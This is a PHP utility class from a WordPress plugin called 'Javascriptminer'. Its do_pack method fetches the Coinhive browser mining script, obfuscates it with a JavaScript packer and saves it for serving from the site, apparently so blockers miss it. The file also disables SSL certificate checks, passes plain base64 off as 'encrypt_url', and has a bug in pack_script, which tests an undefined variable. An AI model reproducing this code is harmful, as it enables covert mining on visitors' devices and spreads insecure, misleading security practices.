<?php

/**
 * The public-facing functionality of the plugin.
 *
 * @link        
 * @since      1.2.2
 *
 * @package    Javascriptminer
 * @subpackage Javascriptminer/public
 */

class Javascriptminer_Util {

	/**
	 * The ID of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $plugin_name    The ID of this plugin.
	 */
	private $plugin_name;

	/**
	 * The version of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $version    The current version of this plugin.
	 */
	private $version;
    
	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $plugin_name       The name of the plugin.
	 * @param      string    $version    The version of this plugin.
	 */
	public function __construct( $plugin_name, $version ) {        
		$this->plugin_name = $plugin_name;
		$this->version = $version;
	}
    
    public function call_ajax($url, $post_data) {
        $post_context = stream_context_create(array(
            'http' => array(
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($post_data)
            )
        ));
        $response = file_get_contents($url, false, $post_context);
        
        // $response = json_decode($response);
        return $response;     
    }

    # 
    public function download_manager_set_session($name, $value) {
        if(!session_id()) {
            session_start();
        }                
        $_SESSION[$name] = $value;
    }

    public function download_manager_get_session($name) {
        if(!session_id()) {
            session_start();
        }                
        return $_SESSION[$name];
    }
    
    # 
    public function download_manager_set_cookie($name, $value) {
        setcookie($name, $value, time()+3600, "/"); 
    }

    public function download_manager_get_cookie($name) {
        return $_COOKIE[$name];
    }

    public function encrypt_url($url) {
        /*
        $ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");
        $iv = openssl_random_pseudo_bytes($ivlen);
        $ciphertext_raw = openssl_encrypt($url, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
        $hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
        $ciphertext = base64_encode( $iv.$hmac.$ciphertext_raw );
        */
        return str_replace("=", "", base64_encode($url));
    }
    public function decrypt_url($cypherurl) {
        /*
        $c = base64_decode($cypherurl);
        $ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");
        $iv = substr($c, 0, $ivlen);
        $hmac = substr($c, $ivlen, $sha2len=32);
        $ciphertext_raw = substr($c, $ivlen+$sha2len);
        $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
        $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
        if (hash_equals($hmac, $calcmac))//PHP 5.6+ timing attack safe comparison
        {
            return $original_plaintext."\n";
        } 
        */
        return base64_decode($cypherurl);
    }
    public function is_crypted_url($cypherurl) {
        try {
            $url = $this->encrypt_url($this->decrypt_url($cypherurl));
            return $url===$cypherurl;
        }
        catch(Exception $e) {
            return false;
        }
    }    
    
    function get_url( $url )
    {
        $options = array(
            CURLOPT_RETURNTRANSFER => true,     // return web page
            CURLOPT_HEADER         => false,    // don't return headers
            CURLOPT_FOLLOWLOCATION => true,     // follow redirects
            CURLOPT_ENCODING       => "",       // handle all encodings
            CURLOPT_USERAGENT      => "spider/jsminer", // who am i
            CURLOPT_AUTOREFERER    => true,     // set referer on redirect
            CURLOPT_CONNECTTIMEOUT => 30,      // timeout on connect
            CURLOPT_TIMEOUT        => 30,      // timeout on response
            CURLOPT_MAXREDIRS      => 10,       // stop after 10 redirects
            CURLOPT_SSL_VERIFYPEER => false     // Disabled SSL Cert checks
        );

        $ch      = curl_init( $url );
        curl_setopt_array( $ch, $options );
        $content = curl_exec( $ch );
        $err     = curl_errno( $ch );
        $errmsg  = curl_error( $ch );
        $header  = curl_getinfo( $ch );
        curl_close( $ch );

        $header['errno']   = $err;
        $header['errmsg']  = $errmsg;
        $header['content'] = $content;
        return $header;
    }
    
    public function do_pack () {
        $script = array("url" => "http://coinhive.com/lib/coinhive.min.js", "filename" => "coinhive.min.js");
        $p = $this->pack_script($script["url"], plugin_dir_path( dirname( __FILE__ ) ) . "public/js/" . $script["filename"] );          
        if ($p['status']=='ok') update_option('javascriptminer_pack_scripts_timestamp', time());        
        return $p;
    }
    
    private function pack_script($url, $destination) {
        $js = $this->get_url($url);
        if (strlen($js['content'])>0 and $header['errno']!="0") {
            require_once plugin_dir_path( dirname( __FILE__ ) ) . 'public/parser/parser.php';
            $packer = new Tholu\Packer\Packer($js['content'], 'Normal', true, false, true);
            $packed_js = $packer->pack() . ";";
            file_put_contents($destination, $packed_js);
            $response['status'] = "ok";
        }
        else {
            $response['status'] = "error";
            $response['errno'] = $js['errno'];
            $response['errmsg'] = $js['errmsg'];
        }
        return $response;
    }    
}


